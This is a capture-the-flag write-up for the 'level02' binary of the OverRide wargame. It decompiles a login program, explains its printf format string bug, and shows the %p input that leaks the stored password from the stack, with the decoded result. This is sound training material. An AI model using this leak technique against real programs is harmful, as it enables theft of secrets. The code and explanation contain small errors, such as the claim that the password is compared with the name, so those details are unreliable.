## Step 1: Static & Dynamic Analysis

```c
int main(int argc, const char **argv, const char **envp)
{
  char name[100];
  char password[118];
  char buffer[48];
  int v5;
  int v8;
  int fd;
  FILE *stream

  memset(name, 0, sizeof(s));
  v8 = 0;
  memset(buffer, 0, 41);
  memset(password, 0, sizeof(password));
  v5 = 0;
  stream = 0;
  fd = 0;
  stream = fopen("/home/users/level03/.pass", "r");
  if ( !stream )
  {
    fwrite("ERROR: failed to open password file\n", 1, 36, stderr);
    exit(1);
  }
  fd = fread(buffer, 1, 41, stream);
  buffer[strcspn(buffer, "\n")] = 0;
  if ( fd != 41 )
  {
    fwrite("ERROR: failed to read password file\n", 1, 36, stderr);
    fwrite("ERROR: failed to read password file\n", 1, 36, stderr);
    exit(1);
  }
  fclose(stream);
  puts("===== [ Secure Access System v1.0 ] =====");
  puts("/***************************************\\");
  puts("| You must login to access this system. |");
  puts("\\**************************************/");
  printf("--[ Username: ");
  fgets(name, 100, stdin);
  name[strcspn(name, "\n")] = 0;
  printf("--[ Password: ");
  fgets(password, 100, stdin);
  password[strcspn(password, "\n")] = 0;
  puts("*****************************************");
  if ( strncmp(buffer, password, 41) )
  {
    printf(name);
    puts(" does not have access!");
    exit(1);
  }
  printf("Greetings, %s!\n", name);
  system("/bin/sh");
}
```
### Explanation

The program start by putting the wordpass we need into a `buffer` on the stack.

```c
  stream = fopen("/home/users/level03/.pass", "r");
  if ( !stream )
  {
    fwrite("ERROR: failed to open password file\n", 1, 36, stderr);
    exit(1);
  }
  fd = fread(buffer, 1, 41, stream);
  buffer[strcspn(buffer, "\n")] = 0;
```

Next, 2 inputs using `fgets()` are taken: a `name` and a `password`.
Finally a comparison between the `buffer` containing the password and `name` is done.

```c
  if ( strncmp(buffer, password, 41) )
  {
    printf(name);
    puts(" does not have access!");
    exit(1);
  }
```

The vulnerability occurs when the comparison between the password stored in `buffer` and `name` fails, causing our input `name` to be passed directly to `printf()`, leading to
a `printf format string` vulnerability  that allows us to read the contents of the stack.

To retrieve the password, we're going to use the `%p` format specifier to print addresses's content in hexadecimal
and see the wordpass ASCII characters.

## Step 2: Exploiting the Binary

```bash
level02@OverRide:~$ ./level02 
===== [ Secure Access System v1.0 ] =====
/**\
| You must login to access this system. |
***/
--[ Username: %p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p
--[ Password: a
*
0x7fffffffe500(nil)(nil)0x2a2a2a2a2a2a2a2a0x2a2a2a2a2a2a2a2a0x7fffffffe6f80x1f7ff9a08
(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)0x100000000(nil)
0x756e5052343768480x45414a35617339510x377a7143574e67580x354a35686e4758730x48336750664b394d0xfeff00 does not have access!
```
Here are the 5 bytes containing every characters that constitutes the password to reverse
because each addresses's content are displayed in little endian.  

```
756e505234376848 45414a3561733951 377a7143574e6758 354a35686e475873 48336750664b394d
unPR47hH         EAJ5as9Q         7zqCWNgX         5J5hnGXs         H3gPfK9M
```

giving this password:

```
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
```